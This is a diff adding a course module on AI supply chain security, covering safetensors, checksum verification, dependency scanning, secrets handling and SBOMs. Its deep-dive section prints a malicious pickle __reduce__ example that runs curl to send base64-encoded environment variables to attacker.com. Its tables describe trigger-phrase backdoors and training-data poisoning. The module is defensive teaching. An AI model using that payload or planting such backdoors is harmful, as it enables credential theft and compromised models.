@@ -1,0 +1,307 @@
+---
+moduleId: "7.6"
+title: "Supply Chain Security"
+description: "The AI supply chain — base model, fine-tuning data, adapters, Python packages, and API keys — has more attack surfaces than teams typically consider. A .pkl file is executable code. An unverified model weight can contain backdoors. This module covers the controls that keep your AI system trustworthy from training data to production inference."
+track: "safety"
+order: 6
+personas: ["leader", "junior", "senior", "sre"]
+volatility: "emerging"
+status: "published"
+lastReviewed: "2026-03-24"
+estimatedMinutes:
+  layer1: 5
+  layer2: 20
+  layer3: 15
+productionGotcha: "Most teams scrutinise their application code for supply chain risk but load model weights from Hugging Face without verification. A .pkl or .pt file is executable code — always use safetensors format or verify checksums against a known-good source before loading weights in production."
+draft: false
+---
+
+## Layer 1 — Surface
+
+Your AI system is not just the code you wrote. It is the base model you selected, the data you fine-tuned on, the LoRA adapters you downloaded, the Python packages you installed, the inference framework you run on, and the API keys that connect it all together. Each of those is a supply chain component — and each is an attack surface.
+
+**The AI supply chain:**
+
+| Layer | Risk | Example attack |
+|---|---|---|
+| **Base model** | Backdoored weights from an untrusted source | A "fine-tuned" model that leaks data when given specific trigger phrases |
+| **Fine-tuning data** | Poisoned training examples that insert backdoors | Customer service training data containing instructions to recommend fraudulent products |
+| **LoRA adapters / weights** | .pkl files containing malicious Python code | A Hugging Face adapter that executes a reverse shell on load |
+| **Python dependencies** | Compromised packages via dependency confusion or typosquatting | A fake `transformerz` package that exfiltrates environment variables |
+| **Inference framework** | Vulnerabilities in vLLM, TGI, or similar servers | CVEs in serving frameworks that allow prompt injection at the HTTP layer |
+| **API keys** | Compromised credentials giving full API access | API key committed to a public GitHub repo, scraped by bots within minutes |
+
+### Why it matters
+
+A backdoored model or compromised package can operate silently — normal inputs produce normal outputs, but specific trigger inputs produce attacker-chosen outputs or take attacker-chosen actions. Unlike a traditional software vulnerability, a model backdoor can be invisible to code review. Supply chain security is the practice of verifying what you run before you run it.
+
+### Production Gotcha
+
+> **Common Gotcha:** {frontmatter.productionGotcha}
+>
+> Teams rightly scrutinise npm packages and pip dependencies. They apply the same scepticism to a random `.pt` file from Hugging Face far less often. A PyTorch `.pt` file is a pickled Python object — loading it runs arbitrary Python code. The fix is to require the safetensors format (which cannot execute code on load) and to verify checksums even for safetensors files.
+
+---
+
+## Layer 2 — Guided
+
+### Verifying model weights before loading
+
+```python
+import hashlib
+import requests
+from pathlib import Path
+
+def compute_sha256(file_path: str) -> str:
+    """Compute the SHA-256 hash of a file."""
+    sha256 = hashlib.sha256()
+    with open(file_path, "rb") as f:
+        for chunk in iter(lambda: f.read(65536), b""):
+            sha256.update(chunk)
+    return sha256.hexdigest()
+
+# Known-good checksums from your model registry
+# In production: store these in a secrets manager or signed manifest, not in code
+MODEL_CHECKSUMS: dict[str, str] = {
+    "models/llama-3-8b.safetensors": "a1b2c3d4e5f6...",  # Replace with real checksum
+    "adapters/customer-support-v2.safetensors": "f6e5d4c3b2a1...",
+}
+
+def load_model_safely(model_path: str) -> None:
+    """
+    Verify the model weight checksum before loading.
+    Raises ValueError if the file is unknown or has been tampered with.
+    """
+    path = Path(model_path)
+
+    # Rule 1: Only allow safetensors format
+    if path.suffix not in {".safetensors"}:
+        raise ValueError(
+            f"Refusing to load {path.suffix} file '{model_path}'. "
+            f"Only .safetensors format is permitted. "
+            f"Convert with: python -c \"import safetensors; safetensors.torch.save_file(...)\" "
+        )
+
+    # Rule 2: Verify the checksum
+    key = str(path)
+    expected = MODEL_CHECKSUMS.get(key)
+    if expected is None:
+        raise ValueError(
+            f"No known checksum for '{model_path}'. "
+            f"Register the expected checksum before loading this file."
+        )
+
+    actual = compute_sha256(model_path)
+    if actual != expected:
+        raise ValueError(
+            f"Checksum mismatch for '{model_path}'. "
+            f"Expected: {expected[:16]}..., Got: {actual[:16]}... "
+            f"The file may have been tampered with."
+        )
+
+    # Rule 3: Load with safetensors (safe, cannot execute code)
+    from safetensors.torch import load_file
+    return load_file(model_path)
+```
+
+### Scanning Python dependencies
+
+```python
+import subprocess
+import json
+
+def scan_dependencies() -> dict:
+    """
+    Run pip-audit to check for known CVEs in installed packages.
+    Returns a summary of vulnerable packages.
+    """
+    result = subprocess.run(
+        ["pip-audit", "--format", "json", "--desc"],
+        capture_output=True,
+        text=True,
+    )
+
+    if result.returncode not in {0, 1}:  # 1 = vulnerabilities found
+        raise RuntimeError(f"pip-audit failed: {result.stderr}")
+
+    try:
+        data = json.loads(result.stdout)
+    except json.JSONDecodeError:
+        return {"error": "Could not parse pip-audit output"}
+
+    vulnerabilities = data.get("vulnerabilities", [])
+    if not vulnerabilities:
+        return {"status": "clean", "packages_scanned": len(data.get("dependencies", []))}
+
+    critical = [v for v in vulnerabilities if v.get("fix_versions")]
+    return {
+        "status": "vulnerable",
+        "total": len(vulnerabilities),
+        "fixable": len(critical),
+        "packages": [
+            {
+                "name": v["name"],
+                "version": v["version"],
+                "vuln_id": v["id"],
+                "fix_versions": v.get("fix_versions", []),
+            }
+            for v in vulnerabilities
+        ],
+    }
+
+def check_for_typosquatting(package_name: str) -> bool:
+    """
+    Warn if a package name looks like a typosquat of a known AI package.
+    """
+    known_packages = {
+        "transformers", "torch", "tensorflow", "anthropic",
+        "openai", "langchain", "llama-index", "chromadb",
+        "sentence-transformers", "huggingface-hub",
+    }
+    from difflib import get_close_matches
+    matches = get_close_matches(package_name, known_packages, n=3, cutoff=0.8)
+    suspicious = [m for m in matches if m != package_name]
+    if suspicious:
+        print(f"[WARN] Package '{package_name}' looks similar to: {suspicious}")
+        return True
+    return False
+```
+
+### Secrets management for API keys
+
+```python
+import os
+from dataclasses import dataclass
+
+@dataclass
+class SecretReference:
+    """
+    A reference to a secret stored in a secrets manager.
+    Never store the actual value in code or config files.
+    """
+    secret_name: str
+    source: str  # "env", "aws_ssm", "aws_secrets_manager", "vault"
+
+class SecretLoader:
+    def load(self, ref: SecretReference) -> str:
+        if ref.source == "env":
+            value = os.environ.get(ref.secret_name)
+            if not value:
+                raise ValueError(
+                    f"Environment variable '{ref.secret_name}' is not set. "
+                    f"Set it in your deployment environment, not in code."
+                )
+            return value
+
+        if ref.source == "aws_ssm":
+            import boto3
+            client = boto3.client("ssm")
+            response = client.get_parameter(Name=ref.secret_name, WithDecryption=True)
+            return response["Parameter"]["Value"]
+
+        if ref.source == "aws_secrets_manager":
+            import boto3
+            client = boto3.client("secretsmanager")
+            response = client.get_secret_value(SecretId=ref.secret_name)
+            return response["SecretString"]
+
+        raise ValueError(f"Unknown secret source: {ref.source}")
+
+# In your configuration — reference, never embed
+API_KEY_REF = SecretReference(
+    secret_name="ANTHROPIC_API_KEY",
+    source="env",
+)
+
+# In your CI/CD pipeline, scan for accidental key commits:
+# git secrets --scan  (or use detect-secrets, gitleaks)
+```
+
+### Generating an AI SBOM
+
+```python
+import json
+import subprocess
+import platform
+from datetime import datetime
+
+def generate_ai_sbom() -> dict:
+    """
+    Generate a Software Bill of Materials for an AI system.
+    Include: Python packages, model files, and runtime info.
+    """
+    # Python packages
+    pip_result = subprocess.run(
+        ["pip", "list", "--format", "json"],
+        capture_output=True, text=True,
+    )
+    packages = json.loads(pip_result.stdout) if pip_result.returncode == 0 else []
+
+    # Model files (from your manifest)
+    model_manifest = [
+        {
+            "path": path,
+            "checksum_sha256": checksum,
+            "format": "safetensors",
+        }
+        for path, checksum in MODEL_CHECKSUMS.items()
+    ]
+
+    return {
+        "generated_at": datetime.utcnow().isoformat() + "Z",
+        "python_version": platform.python_version(),
+        "platform": platform.platform(),
+        "packages": packages,
+        "models": model_manifest,
+    }
+```
+
+---
+
+## Layer 3 — Deep Dive
+
+### Why .pkl and .pt files are dangerous
+
+Python's `pickle` serialisation format is designed to reconstruct arbitrary Python objects. When you call `torch.load("model.pt")`, Python deserialises the file, which means executing any `__reduce__` method on any object in the file. A malicious `.pt` file can contain:
+
+```python
+# What a malicious __reduce__ method can do — do not load untrusted .pt files
+# This is illustrative; real attacks are obfuscated
+import os
+class Exploit:
+    def __reduce__(self):
+        return (os.system, ("curl https://attacker.com/exfil?data=$(env | base64)",))
+```
+
+The safetensors format stores only numerical tensors in a flat binary format with no executable components. It is the correct default for loading weights from any source you did not produce yourself.
+
+### Data poisoning and backdoor attacks
+
+Model backdoors from data poisoning:
+
+| Attack variant | Method | Detection |
+|---|---|---|
+| **Trigger backdoor** | Training data contains examples with a specific trigger phrase → specific output | Held-out test set with trigger; anomaly detection on output distribution |
+| **Targeted poisoning** | Training data contains incorrect labels for specific inputs | Clean-label detection; cross-validation on suspicious samples |
+| **Instruction backdoor** | Fine-tuning instructions include a backdoor pattern | Audit training data before use; adversarial training data evaluation |
+
+For fine-tuned models: audit your training data, especially if sourced from users or third parties. Run a held-out evaluation with adversarial inputs before deploying a fine-tuned model.
+
+### Supply chain controls checklist
+
+| Control | Implemented by |
+|---|---|
+| Require safetensors for all model weights | Enforce in model loading code |
+| Verify checksums against signed manifest | CI/CD gate; load-time check |
+| Scan Python dependencies with pip-audit | CI/CD gate on every build |
+| Scan git history for secrets with detect-secrets | Pre-commit hook + CI |
+| Store all API keys in secrets manager | Never in code or config files |
+| Generate and store AI SBOM per release | CI/CD artifact |
+| Require model cards for all models used | Procurement/evaluation process |
+| Allowlist trusted model sources | Policy + code enforcement |
+
+### Further reading
+
+- [Poisoning Web-Scale Training Datasets is Practical](https://arxiv.org/abs/2302.10149) — Carlini et al., 2023. Demonstrates that training data poisoning at scale is realistic; establishes the threat model for data poisoning attacks.
+- [safetensors format](https://huggingface.co/docs/safetensors) — Hugging Face, 2022–2024. Technical reference for the safe serialisation format; explains why it cannot execute code on load.
+- [SLSA: Supply Chain Levels for Software Artefacts](https://slsa.dev/) — Google, 2021–2024. Framework for supply chain security levels; applicable to AI model artefacts with adaptation.
